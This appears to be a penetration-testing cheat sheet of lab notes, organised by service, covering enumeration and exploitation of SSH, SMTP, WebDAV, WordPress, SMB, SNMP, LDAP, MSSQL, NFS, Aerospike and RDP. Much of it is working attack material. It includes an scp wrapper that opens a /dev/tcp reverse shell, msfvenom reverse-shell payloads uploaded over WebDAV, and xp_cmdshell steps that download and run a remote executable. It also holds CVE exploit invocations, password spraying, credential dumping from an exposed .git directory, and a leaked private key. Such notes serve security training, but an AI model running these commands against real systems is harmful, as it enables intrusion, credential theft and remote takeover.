This means you are most likely using the private key for the wrong user, try doing a cat /etc/passwd in order to find other users to try it on. This error came from me trying a private key on the wrong user and private key which has no password asking for a password

```
ssh root@192.168.214.125 -p43022 -i id_rsa  
Warning: Identity file id_rsa not accessible: No such file or directory.
The authenticity of host '[192.168.214.125]:43022 ([192.168.214.125]:43022)' can't be established.
ED25519 key fingerprint is SHA256:rNaauuAfZyAq+Dhu+VTKM8BGGiU6QTQDleMX0uANTV4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.214.125]:43022' (ED25519) to the list of known hosts.
root@192.168.214.125's password: 
Permission denied, please try again.
root@192.168.214.125's password: 
Permission denied, please try again.
root@192.168.214.125's password: 
root@192.168.214.125: Permission denied (publickey,password).
```


## Downloading files

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > Downloading files`

```
 --- SSH ---

scp -r -i id_rsa USERZ@192.168.214.149:/path/to/file/you/want .


ssh-keygen -y -f id_rsa > id_rsa.pub
cp id_rsa authorized_keys
ssh -i id_rsa max@192.168.180.100
scp -O -i id_rsa authorized_keys max@192.168.180.100:/home/max/.ssh/authorized_keys
```

```
kali@kali:~/home/userA$ cat scp_wrapper.sh 
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac
```

```
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    bash -i >& /dev/tcp/192.168.18.11/443 0>&1
    ;;
esac
```

```
scp -i .ssh/id_rsa scp_wrapper.sh userA@192.168.120.29:/home/userA/
```

```
kali@kali:~$ sudo nc -nlvp 443
```

```
kali@kali:~/home/userA$ ssh -i .ssh/id_rsa userA@192.168.120.29
PTY allocation request failed on channel 0
ACCESS DENIED.
```

```
connect to [192.168.118.11] from (UNKNOWN) [192.168.120.29] 48666
bash: cannot set terminal process group (932): Inappropriate ioctl for device
bash: no job control in this shell
userA@sorcerer:~$ id
id
uid=1003(userA) gid=1003(userA) groups=1003(userA)
userA@sorcerer:~$
```


## Login

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > Login`

```
telnet -l jess 10.2.2.23
```

```
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25
```

```
nc -nv $IP 25
telnet $IP 25
EHLO ALL
VRFY <USER>
```


## Exploits Found

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > Exploits Found`

SMTP PostFix Shellshock

```
https://gist.github.com/YSSVirus/0978adadbb8827b53065575bb8fbcb25
python2 shellshock.py 10.11.1.231 useradm@mail.local 192.168.119.168 139 root@mail.local #VRFY both useradm and root exist
```

```
dnsrecon -d heist.example -n 192.168.54.165 -t axfr
```


## FingerPrinting

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > FingerPrinting`

```
whatweb -a 3 $IP
nikto -ask=no -h http://$IP 2>&1
```


## Dirb

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > Dirb`

```
dirb http://target.com
```


## VestaCP (Authenticated RCE)

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE)`

https://github.com/rekter0/exploits/blob/master/VestaCP/vestaROOT.py
- Download **ALL** Python scripts (`VestaFuncs.py`, `vestaATO.py`, `vestaROOT.py`)

```bash
pip install -r requirements.txt

# may need venv

chmod a+x vesta*

python3 VestaFuncs.py

python3 vestaROOT.py https://192.168.237.156:8083 <username> <password>
```


## java/apk files

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > java/apk files`

```
jadx-gui
```

```
APK stands for Android Package Kit. It is the file format used by the Android operating system to distribute and install applications. An APK file contains all the necessary components and resources of an Android application, such as code, assets, libraries, and manifest files.
```


## Hacktricks

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > WebDav > Hacktricks`

```
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav
```


## nmap results

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > WebDav > nmap results`

```
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
```


## Exploitation w/creds

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > WebDav > Exploitation w/creds`

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f aspx -o shell.aspx
```

```
curl -T 'shell.aspx' 'http://$VictimIP/' -u <username>:<password>
```

```
http://$VictimIP/shell.aspx

nc -nlvp 80  
listening on [any] 80 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.153.122] 49997
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
service\defaultservice
```


## WP Scan

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > CMS > WP Scan`

```
wpscan --url http://$IP/wp/
```

```
wpscan --url http://$IP/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
```


## simple-file-list

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > CMS > simple-file-list`

https://www.exploit-db.com/exploits/48979

```
[+] simple-file-list
 | Location: http://192.168.192.105/wp-content/plugins/simple-file-list/
 | Last Updated: 2023-05-17T17:12:00.000Z
 | [!] The version is out of date, the latest version is 6.1.7
```

```
https://www.exploit-db.com/exploits/48979

Simple File List < 4.2.3 - Unauthenticated Arbitrary File Upload
```


## Malicous Plugins

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > CMS > Malicous Plugins`

```
https://github.com/wetw0rk/malicious-wordpress-plugin
python3 wordpwn.py 192.168.119.140 443 Y

meterpreter > shell
Process 1098 created.
Channel 0 created.
python3 -c 'import pty;pty.spawn("/bin/bash")'
```


## Drupal scan

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > CMS > Drupal scan`

```
droopescan scan drupal -u http://10.11.1.50:80
```


## .git

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > CMS > .git`

```
sudo wget -r http://192.168.192.144/.git/ #dirb showed a .git folder
```

```
cd 192.168.192.144 #Move into the .git directory localy
```

```
sudo git show #Run a git show command in order to expose more information as below.                                                             
commit 213092183092183092138 (HEAD -> main)
Author: Stuart <luke@example.com>
Date:   Fri Nov 18 16:58:34 2022 -0500

    Security Update

diff --git a/configuration/database.php b/configuration/database.php
index 55b1645..8ad08b0 100644
--- a/configuration/database.php
+++ b/configuration/database.php
@@ -2,8 +2,9 @@
 class Database{
     private $host = "localhost";
     private $db_name = "staff";
-    private $username = "stuart@example.lab";
-    private $password = "password123";
+    private $username = "";
+    private $password = "";
+// Cleartext creds cannot be added to public repos!
     public $conn;
     public function getConnection() {
         $this->conn = null;
```


## Exploitation CVEs

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Exploitation CVEs`

```c
BoF (Revert if break)
Mobile Mouse Server 3.6.0.4
https://github.com/CSpanias/mobile-mouse-rce
https://www.exploit-db.com/exploits/51010


python3 mobile-mouse-rce.py --target <TARGET_IP> --lhost <YOUR_IP> --lport <YOUR_PORT>

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=8443 -f exe > uwu.exe

rlwrap -cAr nc -lnvp 8443

python3 ~/offsec/Tools/mobile-mouse-rce.py --target 192.168.130.155 --server-port 9099 --payload uwu.exe --verbose

May need to modify exploit to include `sleep(50)` if initial shell fails...sleep(50) after the line run2 = s.recv(54)

May need to use MSF...
```

```
CVE-2014-6287 https://www.exploit-db.com/exploits/49584 #HFS (HTTP File Server) 2.3.x - Remote Command Execution
```

```
CVE-2015-6518 https://www.exploit-db.com/exploits/24044 phpliteadmin <= 1.9.3 Remote PHP Code Injection Vulnerability
```

```
CVE-XXXX-XXXX https://www.exploit-db.com/exploits/25971 Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion
```

```
CVE-2009-4623 https://www.exploit-db.com/exploits/9623  Advanced comment system1.0  Remote File Inclusion Vulnerability
https://github.com/hupe1980/CVE-2009-4623/blob/main/exploit.py
```

```
CVE-2018-18619 https://www.exploit-db.com/exploits/45853 Advanced Comment System 1.0 - SQL Injection
```

```
80/tcp   open  http     Apache httpd 2.4.49
```

[![image](https://user-images.githubusercontent.com/127046919/235009511-9135cd2a-06b7-4a15-9ad4-378fb0e797a1.png)](https://user-images.githubusercontent.com/127046919/235009511-9135cd2a-06b7-4a15-9ad4-378fb0e797a1.png)


## POC

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Exploitation CVEs > POC`

```
./50383.sh targets.txt /etc/ssh/*pub
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@example01

./50383.sh targets.txt /home/userE/.ssh/id_ecdsa
192.168.138.245:8000
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAO+eRFhQ
13fn2kJ8qptynMAAAAEAAAAAEAAABoAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlz
dHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThM
fArBngFjl7RJYCOTqY5Mmid0sNJwAAAACw0HaBF7zp/0Kiunf161d9NFPIY2bdCayZsxnF
ulMdp1RxRcQuNoGPkjOnyXK/hj9lZ6vTGwLyZiFseXfRi8Dd93YsG0VmEOm3BWvvCv+26M
8eyPQgiBD4dPphmNWZ0vQJ6qnbZBWCmRPCpp2nmSaT3odbRaScEUT5VnkpxmqIQfT+p8AO
CAH+RLndklWU8DpYtB4cOJG/f9Jd7Xtwg3bi1rkRKsyp8yHbA+wsfc2yLWM=
-----END OPENSSH PRIVATE KEY-----
```


## Background

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > /etc/hosts FQDN > Background`

```
on our initial scan we were able to find a pdf file that included credentials and instructions to setup an umbraco cms. "IIS is configured to only allow access to Umbraco the server is FQDN at the moment e.g. example02.example.com, not just example02"
```


## Initial Scan

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > /etc/hosts FQDN > Initial Scan`

```
nmap -p 80,443,5985,14080,47001 -sC -sV -A 192.168.138.247                                                  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-25 18:58 EDT
Nmap scan report for example02.example.com (192.168.138.247)
Host is up (0.067s latency).

PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-title: example - New Hire Information
443/tcp   open  ssl/http Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: example - New Hire Information
5985/tcp  open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
14080/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
47001/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unexampleble because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|10|2012 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows Server 2016 (89%), Microsoft Windows 10 (86%), Microsoft Windows 10 1607 (86%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   51.93 ms 192.168.119.1
2   51.88 ms example02.example.com (192.168.138.247)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.34 seconds
```


## cat /etc/hosts

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > /etc/hosts FQDN > cat /etc/hosts`

```
127.0.0.1       localhost
127.0.1.1       kali
192.168.138.247 example02.example.com
```

```
nmap -p 80,443,5985,14080,47001 -sC -sV -A example02.example.com
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-25 19:00 EDT
Nmap scan report for example02.example.com (192.168.138.247)
Host is up (0.092s latency).

PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-title: example - New Hire Information
443/tcp   open  ssl/http Apache httpd 2.4.54 (OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_http-title: example - New Hire Information
5985/tcp  open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
14080/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-trane-info: Problem with XML parsing of /evox/about
47001/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|10|2012 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Server 2016 (89%), Microsoft Windows 10 (85%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   100.83 ms 192.168.119.1
2   100.82 ms example02.example.com (192.168.138.247)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.21 seconds
```

[![image](https://user-images.githubusercontent.com/127046919/234426419-f8aa53ae-f5f7-4815-92d5-99dfde8ba5fb.png)](https://user-images.githubusercontent.com/127046919/234426419-f8aa53ae-f5f7-4815-92d5-99dfde8ba5fb.png)


## Enumerate

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Enumerate`

In this situation we used another service on port 4555 and reset the password of ryuu to test in order to login into pop3 and grab credentials for ssh. SSH later triggered an exploit which caught us a restricted shell as user ryuu

```
nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 $IP
```

```
telnet $IP 110 #Connect to pop3
USER ryuu #Login as user
PASS test #Authorize as user
list #List every message
retr 1 #retrieve the first email
```


## Enumerate

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Enumerate`

```
nmap -sV -p 111 --script=rpcinfo $IP
```


## VestaCP (Authenticated RCE) / Enumeration

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Enumeration`

```
rpcdump.py 10.1.1.68 -p 135
```

Port 139 NetBIOS stands for Network Basic Input Output System. It is a software protocol that allows applications, PCs, and Desktops on a local area network (LAN) to communicate with network hardware and to transmit data across the network. Software applications that run on a NetBIOS network locate and identify each other via their NetBIOS names. A NetBIOS name is up to 16 characters long and usually, separate from the computer name. Two applications start a NetBIOS session when one (the client) sends a command to “call” another client (the server) over TCP Port 139. (extracted from here)

Port 445 While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.


## nmap

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Enumeration > nmap`

```
nmap --script smb-enum-shares.nse -p445 $IP
nmap –script smb-enum-users.nse -p445 $IP
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 $IP
nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 $IP
nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 $IP
```


## OS Discovery

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Enumeration > OS Discovery`

```
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery $IP
```

smbmap

```
smbmap -H $IP
smbmap -u "user" -p "pass" -H $IP
smbmap -H $IP -u null
smbmap -H $IP -P 139 2>&1
smbmap -H $IP -P 445 2>&1
smbmap -u null -p "" -H $IP -P 139 -x "ipconfig /all" 2>&1
smbmap -u null -p "" -H $IP -P 445 -x "ipconfig /all" 2>&1
```

rpcclient

```
rpcclient -U "" -N $IP
enumdomusers
enumdomgroups
queryuser 0x450
enumprinters
querydominfo
createdomuser
deletedomuser
lookupnames
lookupsids
lsaaddacctrights
lsaremoveacctrights
dsroledominfo
dsenumdomtrusts
```

enum4linux

```
enum4linux -a -M -l -d $IP 2>&1
enum4linux -a -u "" -p "" 192.168.180.71 && enum4linux -a -u "guest" -p "" $IP
```

crackmapexec

```
crackmapexec smb $IP
crackmapexec smb $IP -u "guest" -p ""
crackmapexec smb $IP --shares -u "guest" -p ""
crackmapexec smb $IP --shares -u "" -p ""
crackmapexec smb 10.1.1.68 -u 'guest' -p '' --users
```

smbclient

```
smbclient -U '%' -N \\\\<smb $IP>\\<share name>
smbclient -U 'guest' \\\\<smb $IP>\\<share name>
prompt off
recurse on
mget *
```

```
smbclient -U null -N \\\\<smb $IP>\\<share name>
```

```
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
smbclient -U '%' -N \\\\$IP\\<share name> -m SMB2
smbclient -U '%' -N \\\\$IP\\<share name> -m SMB3
```

```
smbclient -L \\192.168.214.125 -U "" -N -p 12445
Sharename       Type      Comment
        ---------       ----      -------
        Sarge       Disk      USERA Files
        IPC$            IPC       IPC Service (Samba 4.13.2)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.214.125 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```

```
smbclient '//192.168.214.125/Sarge' -p 12445
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
```


## VestaCP (Authenticated RCE) / Enumeration

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Enumeration`

```
nmap -p 143 --script imap-ntlm-info $IP
```

```
sudo nmap --script snmp-* -sU -p161 $IP
sudo nmap -sU -p 161 --script snmp-brute $IP --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
```

```
snmpwalk -c public -v1 $IP
```


## Hacktricks

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Hacktricks`

```
https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp
```

```
apt-get install snmp-mibs-downloader
sudo download-mibs
sudo vi /etc/snmp/snmp.conf
```

```
$ cat /etc/snmp/snmp.conf     
# As the snmp packages come without MIB files due to license reasons, loading
# of MIBs is disabled by default. If you added the MIBs you can reenable
# loading them by commenting out the following line.
#mibs :

# If you want to globally change where snmp libraries, commands and daemons
# look for MIBS, change the line below. Note you can set this for individual
# tools with the -M option or MIBDIRS environment variable.
#
# mibdirs /usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf
```

```
sudo snmpbulkwalk -c public -v2c $IP .
sudo snmpbulkwalk -c public -v2c $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

```
ldapsearch -x -H ldap://192.168.214.122

# extended LDIF
#
# LDAPv3
# base <> (default) with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 32 No such object
text: 0000208D: NameErr: DSID-0310021C, problem 2001 (NO_OBJECT), data 0, best 
 match of:
        ''

# numResponses: 1
```

```
ldapsearch -x -H ldap://192.168.214.122 -s base namingcontexts

# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=exampleH,DC=example
namingcontexts: CN=Configuration,DC=exampleH,DC=example
namingcontexts: CN=Schema,CN=Configuration,DC=exampleH,DC=example
namingcontexts: DC=DomainDnsZones,DC=exampleH,DC=example
namingcontexts: DC=ForestDnsZones,DC=exampleH,DC=example

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

```
ldapsearch -x -H ldap://192.168.214.122 -b "DC=exampleH,DC=example"
```


## VestaCP (Authenticated RCE) / Enumeration

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Enumeration`

```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $IP

dbeaver
```


## Crackmapexec

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Crackmapexec`

```
proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148
proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148 -q 'SELECT name FROM master.dbo.sysdatabases;'
```


## Logging in

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Logging in`

```
sqsh -S $IP -U sa -P CrimsonQuiltScalp193 #linux
proxychains sqsh -S 10.10.126.148 -U example.com\\sql_service -P password123 -D msdb #windows
```


## Expliotation

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Expliotation`

```
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell 'whoami'
go
xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://10.10.126.147:7781/rshell.exe -OutFile c:\Users\Public\reverse.exe"'
go
xp_cmdshell 'c:\Users\Public\reverse.exe"'
go
```


## Mounting

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Mounting`

```
sudo mount -o [options] -t nfs ip_address:share directory_to_mount
mkdir temp 
mount -t nfs -o vers=3 10.11.1.72:/home temp -o nolock
```

```
sudo groupadd -g 1014 <group name>
sudo groupadd -g 1014 1014
sudo useradd -u 1014 -g 1014 <user>
sudo useradd -u 1014 -g 1014 test
sudo passwd <user>
sudo passwd test
```


## Changing permissions

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Changing permissions`

The user cannot be logged in or active

```
sudo usermod -aG 1014 root
```


## Changing owners

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Changing owners`

```
-rw------- 1 root root 3381 Sep 24  2020 id_rsa
```

```
sudo chown kali id_rsa
```

```
-rw------- 1 kali root 3381 Sep 24  2020 id_rsa
```


## VestaCP (Authenticated RCE) / Enumeration

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Enumeration`

```
nc -nv $IP 3003 #run this
```

```
help #run this
```

```
bins;build;build_os;build_time;cluster-name;config-get;config-set;digests;dump-cluster;dump-fabric;dump-hb;dump-hlc;dump-migrates;dump-msgs;dump-rw;dump-si;dump-skew;dump-wb-summary;eviction-reset;feature-key;get-config;get-sl;health-outliers;health-stats;histogram;jem-stats;jobs;latencies;log;log-set;log-message;logs;mcast;mesh;name;namespace;namespaces;node;physical-devices;quiesce;quiesce-undo;racks;recluster;revive;roster;roster-set;service;services;services-alumni;services-alumni-reset;set-config;set-log;sets;show-devices;sindex;sindex-create;sindex-delete;sindex-histogram;statistics;status;tip;tip-clear;truncate;truncate-namespace;truncate-namespace-undo;truncate-undo;version;
```

```
version #run this
```

```
Aerospike Community Edition build 5.1.0.1
```


## Exploitation

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Exploitation`

```
wget https://raw.githubusercontent.com/b4ny4n/CVE-2020-13151/master/cve2020-13151.py
python3 cve2020-13151.py --ahost=192.168.208.143 --aport=3000 --pythonshell --lhost=192.168.45.208 --lport=443
nc -nlvp 443
```


## VestaCP (Authenticated RCE) / Enumeration

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Enumeration`

```
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.11.1.8
```


## VestaCP (Authenticated RCE) / Enumeration

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Enumeration`

```
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 $IP -Pn
```


## Password Spray

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Password Spray`

```
crowbar -b rdp -s 10.11.1.7/32 -U users.txt -C rockyou.txt
```


## logging in

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > Password Spray > logging in`
